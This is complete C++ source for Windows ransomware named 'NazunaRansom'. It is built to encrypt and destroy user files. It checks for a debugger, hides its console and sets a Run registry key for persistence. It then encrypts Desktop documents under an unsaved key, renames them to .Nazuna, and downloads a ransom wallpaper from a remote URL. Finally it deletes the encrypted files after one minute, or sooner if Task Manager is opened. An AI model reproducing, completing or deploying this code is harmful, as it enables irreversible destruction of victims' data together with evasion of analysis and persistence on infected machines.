#include <iostream>
#include <fstream>
#include <chrono>
#include <thread>
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>
#include <fstream>
#include <vector>
#include <filesystem>
#include <iostream>

using namespace std;

#pragma comment(lib, "urlmon.lib")

#define BUF_LEN 1024
#define KEY_TAM 16
#define USER_TAM 256
#define MUTEX "TeAmoNazuna"
BOOL IsDebug = FALSE;

bool cifrar_archivos(const string& ruta_archivo);
void recorrer_dir(const string& ruta_recorrer);
void eliminar_archivos_cifrados(const string& ruta_recorrer);
DWORD WINAPI eliminar_archivos_routine(LPVOID lpParam);
void persistencia();

bool cifrar_archivos(const string& ruta_archivo) {
    HCRYPTPROV hProv;
    HCRYPTKEY hkey;
    BYTE buf[BUF_LEN];
    static constexpr BYTE KEY[KEY_TAM] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
    static constexpr BYTE IV[KEY_TAM] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };

    ifstream archivo_original(ruta_archivo, ios::binary);
    if (!archivo_original.is_open()) {
        return false;
    }

    archivo_original.read(reinterpret_cast<char*>(buf), BUF_LEN);
    DWORD bytes_leer = static_cast<DWORD>(archivo_original.gcount());
    archivo_original.close();

    DWORD mode = CRYPT_MODE_CBC;

    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0)) {
        if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
            return false;
        }
    }

    CryptGenKey(hProv, CALG_AES_128, CRYPT_EXPORTABLE, &hkey);
    CryptSetKeyParam(hkey, KP_IV, IV, 0);
    CryptSetKeyParam(hkey, KP_MODE, reinterpret_cast<const BYTE*>(&mode), 0);
    CryptEncrypt(hkey, 0, true, 0, buf, &bytes_leer, BUF_LEN);

    ofstream archivo_cifrado(ruta_archivo, ios::binary);

    if (!archivo_cifrado.is_open()) {
        CryptDestroyKey(hkey);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    archivo_cifrado.write(reinterpret_cast<char*>(buf), bytes_leer);
    archivo_cifrado.close();

    CryptDestroyKey(hkey);
    CryptReleaseContext(hProv, 0);

    return true;
}

void recorrer_dir(const string& ruta_recorrer) {
    vector<string> subdirectorios;

    string ruta_encriptar = ruta_recorrer + "\\*";
    WIN32_FIND_DATA ruta_data;
    HANDLE hFind = FindFirstFile(ruta_encriptar.c_str(), &ruta_data);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (ruta_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strcmp(ruta_data.cFileName, ".") != 0 && strcmp(ruta_data.cFileName, "..") != 0) {
                    string subruta_recorrer = ruta_recorrer + "\\" + ruta_data.cFileName;
                    subdirectorios.push_back(subruta_recorrer);
                }
            }
            else {
                const string ruta_archivo = ruta_recorrer + "\\" + ruta_data.cFileName;
                const string extension = filesystem::path(ruta_archivo).extension().string();

                if (extension == ".txt" || extension == ".cpp" || extension == ".pdf" || extension == ".docx" || extension == ".xlsx") {
                    if (cifrar_archivos(ruta_archivo)) {
                        const string newFileName = filesystem::path(ruta_archivo).replace_extension(".Nazuna").string();
                        filesystem::rename(ruta_archivo, newFileName);
                    }
                }
            }
        } while (FindNextFile(hFind, &ruta_data));

        FindClose(hFind);
    }

    for (const auto& subdir : subdirectorios) {
        recorrer_dir(subdir);
    }
}

void eliminar_archivos_cifrados(const string& ruta_recorrer) {
    WIN32_FIND_DATA ruta_data;
    HANDLE hFind = FindFirstFile((ruta_recorrer + "\\*").c_str(), &ruta_data);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (ruta_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strcmp(ruta_data.cFileName, ".") != 0 && strcmp(ruta_data.cFileName, "..") != 0) {
                    eliminar_archivos_cifrados(ruta_recorrer + "\\" + ruta_data.cFileName);
                }
            }
            else {
                const string ruta_archivo = ruta_recorrer + "\\" + ruta_data.cFileName;
                const string extension = filesystem::path(ruta_archivo).extension().string();

                if (extension == ".Nazuna") {
                    if (remove(ruta_archivo.c_str()) == 0) {

                    }
                }
            }
        } while (FindNextFile(hFind, &ruta_data));
        FindClose(hFind);
    }
}

void persistencia() {
    HKEY hKey;
    LPCSTR lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCSTR lpValueName = "NazunaRansom";
    char lpValue[MAX_PATH];

    string ruta_descarga = filesystem::path(string(getenv("USERPROFILE")) + "\\Downloads").string();
    string ruta_ransom = ruta_descarga + "\\NazunaRansom.exe";

    strncpy_s(lpValue, MAX_PATH, ruta_ransom.c_str(), MAX_PATH);

    if (RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (BYTE*)lpValue, strlen(lpValue) + 1) == ERROR_SUCCESS) {
            cout << "Si funciona" << endl;
        }
        RegCloseKey(hKey);
    }
}

void cambiar_fondo() {
    char username[USER_TAM];
    DWORD username_tam = USER_TAM;

    GetUserNameA(username, &username_tam);
    const char* url = "https://raw.githubusercontent.com/ic4rta/NazunaRansom/main/Nazuna_Ransom_Fondo.jpg";

    string destino_guardar = "C:\\Users\\";
    destino_guardar += username;
    destino_guardar += "\\Downloads\\Nazuna_Ransom_Fondo.jpg";

    LPCSTR lpcstr_destino = destino_guardar.c_str();

    URLDownloadToFile(NULL, url, lpcstr_destino, 0, NULL);
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)lpcstr_destino, SPIF_UPDATEINIFILE);
}

DWORD WINAPI eliminar_archivos_routine(LPVOID lpParam) {
    const string& ruta_recorrer = static_cast<const char*>(lpParam);
    this_thread::sleep_for(chrono::minutes(1));
    eliminar_archivos_cifrados(ruta_recorrer);
    return 0;
}

int main() {
    HANDLE mutex = OpenMutex(MUTEX_ALL_ACCESS, FALSE, MUTEX);
    if (mutex != NULL) {
        CloseHandle(mutex);
        exit(-1);
    }else{
        mutex = CreateMutex(NULL, TRUE, MUTEX);
        if (mutex == NULL){
            DWORD error = GetLastError();
            if (error == ERROR_ALREADY_EXISTS){
                exit(-1);
            }
        }else{
            if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &IsDebug)){
                if (IsDebug){
                    exit(-1);
                }else{
                    HWND ventana_cmd = GetConsoleWindow();
                    ShowWindow(ventana_cmd, SW_HIDE);

                    persistencia();

                    string ruta = filesystem::path(string(getenv("USERPROFILE")) + "\\Desktop").string();
                    recorrer_dir(ruta);
                    cambiar_fondo();

                    HANDLE hThread = CreateThread(NULL, 0, eliminar_archivos_routine, (LPVOID)ruta.c_str(), 0, NULL);
                    if (hThread != NULL) {
                        while (true) {
                            HWND taskManagerWnd = FindWindowA("TaskManagerWindow", nullptr);
                            if (taskManagerWnd != nullptr) {
                                eliminar_archivos_cifrados(ruta);
                                break;
                            }
                            this_thread::sleep_for(chrono::seconds(1));
                        }
                        CloseHandle(hThread);
                    }
                    while (true) { }
                }
            }
        }
    }
    return 0;
}